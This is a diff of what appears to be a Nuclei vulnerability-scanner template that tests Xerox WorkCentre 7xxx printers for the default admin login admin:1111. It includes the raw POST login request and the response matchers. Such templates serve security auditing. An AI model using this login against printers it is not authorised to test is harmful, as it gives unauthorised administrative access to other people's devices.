@@ -1,10 +1,9 @@
 id: xerox7-default-login
-
 info:
-  name: Xerox WorkCentre 7xxx Printer - Default Login
+  name: Xerox WorkCentre 7xxx Printer Default Login
   author: MiroslavSotak
   severity: high
-  description: Xerox WorkCentre 7xxx Printer default login credentials were discovered.
+  description: Xerox WorkCentre 7xxx printer. default admin credentials admin:1111 were discovered.
   reference:
     - https://www.support.xerox.com/en-us/article/en/x_wc7556_en-O23530
   classification:
@@ -13,42 +12,36 @@ info:
     cwe-id: CWE-522
   metadata:
     max-request: 1
-  tags: xerox,default-login,vuln
-
+  tags: default-login,vuln,xerox
 http:
-  - raw:
+  - attack: pitchfork
+    matchers:
+      - status:
+          - 200
+        type: status
+      - condition: and
+        part: body
+        type: word
+        words:
+          - window.opener.top.location.pathname
+          - Xerox Corporation
+      - condition: or
+        negative: true
+        part: body
+        type: word
+        words:
+          - invalid
+          - errmsg
+    matchers-condition: and
+    payloads:
+      password:
+        - 1111
+      username:
+        - admin
+    raw:
       - |
         POST /userpost/xerox.set HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
 
         _fun_function=HTTP_Authenticate_fn&NextPage=%2Fproperties%2Fauthentication%2FluidLogin.php&webUsername={{username}}&webPassword={{password}}&frmaltDomain=default
-
-    attack: pitchfork
-    payloads:
-      username:
-        - admin
-      password:
-        - 1111
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-
-      - type: word
-        part: body
-        words:
-          - "window.opener.top.location.pathname"
-          - "Xerox Corporation"
-        condition: and
-
-      - type: word
-        part: body
-        words:
-          - "invalid"
-          - "errmsg"
-        condition: or
-        negative: true
-
